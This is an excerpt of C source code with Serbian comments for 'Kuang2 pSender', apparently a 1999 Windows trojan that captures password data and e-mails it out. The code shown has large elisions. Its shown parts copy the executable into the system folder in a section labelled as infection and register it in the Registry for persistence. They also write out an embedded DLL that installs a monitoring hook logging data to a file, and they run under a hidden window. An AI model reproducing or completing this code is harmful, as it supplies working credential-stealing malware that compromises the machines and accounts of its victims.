/***[ThuNderSoft]*************************************************************
				  KAUNG2 pSender: šalje DUP podatke na e-mail
								   ver: 0.34
								     WEIRD
*****************************************************************************/
...
// ver 0.23 (20-feb-1999): ubačen DLL i negovo kreiranje i startovanje hooka
...
// Maximalna dužina imena fajla, pošto se na osnovu njega kreiraju
// razna druga imena
#define MAX_FILENAMELEN		31

// Ove stvari se moraju same odrediti kako bi se ubrzao proces instalranja
// Svaki put ih ažuriraj kada se menja dll!
#define		DLL_SIZE		5632
#define		DL_NAME_OFS		0x1000

char compname[MAX_COMPUTERNAME_LENGTH+1];	// ime kompjutera
char sysfile[MAX_PATH+1];					// ime fajla koje beleži podatke
char appname[MAX_PATH+1];					// ime exe fajla koje će biti ubačeno u Registry
char dllname[MAX_PATH+1];					// ime dll-a koji će biti stvoren
...
BOOL InitApp(HINSTANCE hInst)
{
	...
	hwndW = CreateWindow(					// kreiramo glavni prozor aplikacije
			...
			psWndName,						// text za Title bar - da bi ga pronašao
			0,								// windows stil
			-1, -1, 0, 0,					// pozicija i veličina
			NULL,							// prethodni hwnd
	...
	return TRUE;				// sve je prošlo dobro, blago meni
...
int Wmain()
{
	...
	DWORD maxcname = MAX_COMPUTERNAME_LENGTH + 1;	// max dužina cname
...
****************************************************************************/
	...
	setfileext(regdataname, "exe");             // postavi exe extenziju u slučaju da je neka druga
	...
	// Prvo proveravamo da li je ova aplikacija već aktivna
	if (FindWindow(NULL, psWndName)) return 0;	// ako jeste, izađi

	i=0;
	// probaj da ga otvoriš <ime>.exe
	...
	if (hFout==INVALID_HANDLE_VALUE) {			// ako <ime>.exe ne postoji
		// ako smo ovde znači da Kuang2 pSender nije instaliran na sistem
		/*** INFEKCIJA ***/
		if (CopyFile(CmdLine, appname, FALSE)) {	// kopiraj ga u system folder
			...
			RegCloseKey(hKey);		// završi zezanje sa registryjom
		}
...
#define		upisano		dwDisposition
	...
	if (hFout==INVALID_HANDLE_VALUE){		// ako <ime>.dll ne postoji
		...
		if (hFout!=INVALID_HANDLE_VALUE) {
			...
			strcopyF(&data_passdll[DL_NAME_OFS], dl_name);	// upiši ime fajla u koji će se zapisivati
			WriteFile(hFout, data_passdll, DLL_SIZE, &upisano, NULL);	// upiši u dll
			CloseHandle(hFout);
		}
	} else CloseHandle(hFout);


	if (i) return 0;	// ako smo inficirali onda izađi da bi
						// oslobodili trenutni exe da može da se
						// obriše.

/***************************************************************************
							uključujemo nadgledanje
****************************************************************************/
	...
	return msg.wParam;			// vraća vrednost od PostQuitMessage
}
